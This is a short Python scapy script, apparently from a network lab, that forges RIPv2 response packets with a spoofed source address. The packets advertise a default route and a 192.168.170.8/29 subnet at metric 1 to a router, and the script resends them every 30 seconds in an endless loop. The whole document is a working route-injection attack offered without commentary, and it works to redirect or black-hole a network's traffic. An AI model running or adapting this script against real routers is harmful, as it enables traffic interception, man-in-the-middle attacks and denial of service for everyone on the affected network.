import time
from scapy.all import *

rip = IP(src="192.168.170.34", dst="192.168.170.33")/UDP(sport=520, dport=520)/RIP(cmd=2, version=2)/RIPEntry(AF=2, addr="0.0.0.0", mask="0.0.0.0", metric = 1)/RIPEntry(AF=2, addr="192.168.170.8", mask="255.255.255.248", metric = 1)

time_sleep = 30

while 1:
    send(rip)
    time.sleep(time_sleep)